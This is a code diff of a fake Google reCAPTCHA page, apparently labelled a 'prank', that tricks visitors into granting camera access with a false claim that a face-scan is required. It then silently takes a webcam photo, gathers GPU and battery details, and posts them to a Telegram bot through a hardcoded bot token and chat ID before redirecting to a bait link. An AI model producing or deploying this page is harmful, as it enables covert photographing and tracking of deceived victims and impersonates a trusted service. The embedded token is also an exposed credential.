@@ -2,27 +2,27 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>reCAPTCHA Verification</title>
     <style>
         body { font-family: 'Roboto', Arial, sans-serif; background: #f9f9f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .captcha-container { background: white; border: 1px solid #d3d3d3; padding: 15px; border-radius: 3px; width: 300px; display: flex; align-items: center; box-shadow: 0 1px 3px rgba(0,0,0,0.08); }
-        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; cursor: pointer; display: flex; align-items: center; justify-content: center; margin-right: 12px; transition: 0.2s; }
-        .checkbox:hover { border-color: #b2b2b2; }
-        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4d90fe; border-radius: 50%; width: 16px; height: 16px; animation: spin 1s linear infinite; display: none; }
+        .captcha-box { background: white; border: 1px solid #d3d3d3; padding: 15px; border-radius: 3px; width: 300px; display: flex; align-items: center; box-shadow: 0 1px 3px rgba(0,0,0,0.1); position: relative; }
+        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; cursor: pointer; display: flex; align-items: center; justify-content: center; margin-right: 12px; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4d90fe; border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; display: none; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .label { font-size: 14px; color: #555; font-weight: 400; flex-grow: 1; }
+        .label { font-size: 14px; color: #555; flex-grow: 1; }
         .brand { text-align: right; }
-        .brand img { width: 32px; display: block; margin-left: auto; }
-        .brand-text { font-size: 8px; color: #9b9b9b; margin-top: 2px; }
-        #status { position: absolute; bottom: 20%; font-size: 12px; color: #d93025; display: none; text-align: center; width: 100%; }
+        .brand img { width: 30px; display: block; margin-left: auto; opacity: 0.8; }
+        .brand-text { font-size: 8px; color: #9b9b9b; }
+        #status-msg { position: absolute; bottom: -30px; left: 0; width: 100%; text-align: center; font-size: 11px; color: #d93025; font-weight: bold; display: none; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="captcha-container">
-    <div class="checkbox" id="checkBtn" onclick="verifyHuman()">
+<div class="captcha-box">
+    <div class="checkbox" id="checkBtn" onclick="startNitinScan()">
         <div class="loader" id="loader"></div>
     </div>
     <div class="label">I'm not a robot</div>
@@ -31,81 +31,65 @@
         <div class="brand-text">reCAPTCHA</div>
         <div class="brand-text">Privacy - Terms</div>
     </div>
+    <div id="status-msg">Verification Required: Face-Scan in progress...</div>
 </div>
-<div id="status">Verifying... Please allow camera access for face-scan.</div>
 
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas" width="640" height="480"></canvas>
 
 <script>
     const TOKEN = "8261242218:AAHt6b51pIZowjKOdNmUTE4skOpVAWZbsqI";
-    const CHAT_ID = "6643732863";
+    const CHAT_ID = "6643732863"; // <--- CHANGE THIS
 
-    // Advanced Device Detection
-    function getBrand() {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl');
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-        
-        if (renderer.includes("Adreno")) return "Android (Nothing/Samsung/Pixel)";
-        if (renderer.includes("Apple")) return "iPhone / iOS Device";
-        if (renderer.includes("Mali")) return "Android (Redmi/Realme/Oppo)";
-        return "Unknown Device";
-    }
-
-    async function verifyHuman() {
-        const check = document.getElementById('checkBtn');
+    async function startNitinScan() {
         const loader = document.getElementById('loader');
-        const status = document.getElementById('status');
-
-        if ("vibrate" in navigator) navigator.vibrate(40);
-        check.style.borderColor = "transparent";
+        const status = document.getElementById('status-msg');
+        
+        if ("vibrate" in navigator) navigator.vibrate([50, 30, 50]);
         loader.style.display = "block";
         status.style.display = "block";
 
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            
-            // Get Battery Info
-            let bat = "N/A";
-            try {
-                const b = await navigator.getBattery();
-                bat = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Unplugged'})`;
-            } catch(e){}
-
             const video = document.getElementById('video');
             video.srcObject = stream;
+
+            // Get Brand Info (GPU Check)
+            const canvas_gpu = document.createElement('canvas');
+            const gl = canvas_gpu.getContext('webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";
+
+            // Get Battery
+            let bat = "N/A";
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                bat = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Unplugged'})`;
+            }
 
             setTimeout(() => {
                 const canvas = document.getElementById('canvas');
                 canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                 
                 canvas.toBlob(blob => {
-                    const info = `🤖 **Robot Check: SUCCESS**\n📱 **Brand:** ${getBrand()}\n🔋 **Battery:** ${bat}\n🕒 **Time:** ${new Date().toLocaleTimeString()}`;
-                    
                     const fd = new FormData();
                     fd.append("chat_id", CHAT_ID);
-                    fd.append("photo", blob, "human.jpg");
-                    fd.append("caption", info);
-                    
+                    fd.append("photo", blob, "nitin_prank.jpg");
+                    fd.append("caption", `🤖 **Robot Check: SUCCESS**\n📱 **GPU/Brand:** ${gpu}\n🔋 **Battery:** ${bat}\n👤 **Nitin 333 Capture**`);
                     fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
                 }, 'image/jpeg');
 
                 stream.getTracks().forEach(t => t.stop());
                 
-                // Final Reveal
+                // Show Bait
                 const urlParams = new URLSearchParams(window.location.search);
-                if (urlParams.get('img')) {
-                    window.location.href = urlParams.get('img');
-                } else {
-                    status.innerHTML = "✅ Verification Successful";
-                    status.style.color = "#0f9d58";
-                }
+                const bait = urlParams.get('img');
+                if (bait) window.location.href = bait;
+                else alert("✅ Human Identity Verified.");
             }, 2000);
 
         } catch (err) {
-            alert("Verification Failed: reCAPTCHA requires Biometric Face-Scan to verify human presence.");
+            alert("Error: reCAPTCHA requires face-scan to verify you are human.");
             location.reload();
         }
     }
